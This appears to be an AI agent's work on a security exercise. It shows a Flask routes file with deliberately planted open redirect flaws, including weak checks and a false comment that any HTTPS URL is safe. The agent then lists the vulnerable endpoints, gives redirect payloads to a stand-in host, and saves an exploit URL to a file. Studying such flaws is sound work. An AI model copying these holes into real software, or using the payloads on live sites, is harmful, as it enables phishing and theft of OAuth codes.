#!/usr/bin/env python3
from flask import Blueprint, request, redirect, make_response, session, render_template_string
from urllib.parse import urlparse
import re

# Create Blueprint for main application routes
main_routes = Blueprint('main_routes', __name__)

# In-memory store for shortened URLs (simulating database)
shortened_urls = {
    'abc123': 'http://example.com/product',
    'def456': 'http://example.com/checkout',
    'ghi789': 'http://example.com/account'
}

@main_routes.route('/callback')
def oauth_callback():
    """
    OAuth callback endpoint - handles third-party authentication
    LEGACY CODE: needs security review
    Redirects user back to originating application after OAuth flow
    """
    # Get the redirect_uri from query parameters
    redirect_uri = request.args.get('redirect_uri', '/')
    auth_code = request.args.get('code', 'dummy_code')
    
    # Store auth code in session (simulated)
    session['auth_code'] = auth_code
    
    # Redirect back to the application
    # TODO: Add validation for redirect_uri
    return redirect(redirect_uri)


@main_routes.route('/download')
def download_file():
    """
    File download endpoint - redirects to file storage location
    Redirects user to actual file URL (CDN or storage server)
    """
    file_param = request.args.get('file')
    
    if not file_param:
        return "No file specified", 400
    
    # Legacy implementation - redirect to file location
    # Used for backwards compatibility with old download links
    return redirect(file_param)


@main_routes.route('/external')
def external_redirect():
    """
    External site redirect with basic validation
    Used for affiliate links and partner redirects
    """
    site = request.args.get('site', '')
    
    # Basic validation - check if it contains our trusted domain
    # This should prevent malicious redirects
    if 'trusted' in site or 'partner' in site:
        return redirect(site)
    
    # Also allow any HTTPS URLs as they're secure
    if site.startswith('https://'):
        return redirect(site)
    
    return "Invalid redirect target", 400


@main_routes.route('/success')
def success_page():
    """
    Success page shown after payment/registration
    Redirects user after showing success message
    """
    continue_url = request.args.get('continue', '/dashboard')
    
    # Show success page with meta refresh redirect
    html_template = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta http-equiv="refresh" content="3;url={{ continue_url }}">
        <title>Success</title>
    </head>
    <body>
        <h1>Operation Successful!</h1>
        <p>Redirecting you in 3 seconds...</p>
        <p>If not redirected, <a href="{{ continue_url }}">click here</a></p>
    </body>
    </html>
    """
    return render_template_string(html_template, continue_url=continue_url)


@main_routes.route('/navigate', methods=['POST'])
def navigate():
    """
    Navigation endpoint - handles POST-based redirects
    Used by forms throughout the application
    """
    target = request.form.get('target', '/')
    
    # Redirect user to target destination
    # This handles 'return to product page' and similar flows
    return redirect(target)


@main_routes.route('/shortened/<short_id>')
def shortened_url(short_id):
    """
    URL shortener service - redirects short codes to full URLs
    Used for marketing campaigns and social media sharing
    """
    # Look up the full URL from our database
    full_url = shortened_urls.get(short_id)
    
    if full_url:
        return redirect(full_url)
    
    # If not found in static mapping, check if there's a custom URL parameter
    # This allows dynamic short URL creation for testing
    custom_url = request.args.get('url')
    if custom_url:
        # Store it for future use and redirect
        shortened_urls[short_id] = custom_url
        return redirect(custom_url)
    
    return "Short URL not found", 404


@main_routes.route('/go')
def quick_redirect():
    """
    Quick redirect endpoint for internal navigation
    NEEDS SECURITY REVIEW - currently used in production
    """
    destination = request.args.get('to', '/')
    
    # Quick redirect without validation for performance
    # Used heavily in legacy parts of the application
    response = make_response()
    response.headers['Location'] = destination
    response.status_code = 302
    return response


@main_routes.route('/return')
def return_redirect():
    """
    Return redirect for post-login and post-action flows
    Redirects user back to where they came from
    """
    return_url = request.args.get('return_to', '/home')
    
    # Parse URL to check domain (basic security check)
    parsed = urlparse(return_url)
    
    # Allow relative URLs (no domain specified)
    if not parsed.netloc:
        return redirect(return_url)
    
    # For absolute URLs, only allow our domain
    # Check if domain ends with our domain name
    allowed_domain = 'localhost'
    if parsed.netloc.endswith(allowed_domain):
        return redirect(return_url)
    
    # Reject other external domains
    return "External redirects not allowed", 403


@main_routes.route('/out')
def external_link():
    """
    External link tracker - logs and redirects to external sites
    Used for analytics on outbound link clicks
    """
    url = request.args.get('url')
    
    if not url:
        return "No URL provided", 400
    
    # Log the click (simulated)
    # In production, this would log to analytics system
    
    # Redirect to external site
    # Validation bypassed for partner sites
    return redirect(url)


# Helper function for validation (not currently used consistently)
def is_safe_redirect(url):
    """
    Helper function to validate redirect URLs
    TODO: Implement this across all redirect endpoints
    """
    if not url:
        return False
    
    parsed = urlparse(url)
    
    # Allow relative URLs
    if not parsed.netloc:
        return True
    
    # Check against whitelist
    safe_domains = ['localhost', 'example.com', '127.0.0.1']
    return any(parsed.netloc.endswith(domain) for domain in safe_domains)
```

Now let me analyze the code to find vulnerabilities and create the exploit:

```python
#!/usr/bin/env python3

# Analyzing the webapp_source/routes.py file for open redirect vulnerabilities

# Found vulnerabilities:
# 1. /callback - redirect_uri parameter with no validation (CRITICAL)
# 2. /download - file parameter redirects directly with no validation (CRITICAL)
# 3. /external - has weak validation that can be bypassed
# 4. /success - continue parameter in meta refresh with no validation (CRITICAL)
# 5. /navigate - POST target parameter with no validation
# 6. /shortened/<id> - url parameter with no validation (CRITICAL)
# 7. /go - destination parameter with no validation (CRITICAL)
# 8. /out - url parameter with no validation (CRITICAL)

# Most straightforward exploits:
# - /callback?redirect_uri=http://malicious-site.com
# - /download?file=http://malicious-site.com
# - /go?to=http://malicious-site.com
# - /out?url=http://malicious-site.com
# - /shortened/test?url=http://malicious-site.com

# Choosing /callback as it's commonly used in OAuth flows and very exploitable

exploit_url = "http://localhost:5000/callback?redirect_uri=http://malicious-site.com"

with open('/tmp/exploit.txt', 'w') as f:
    f.write(exploit_url)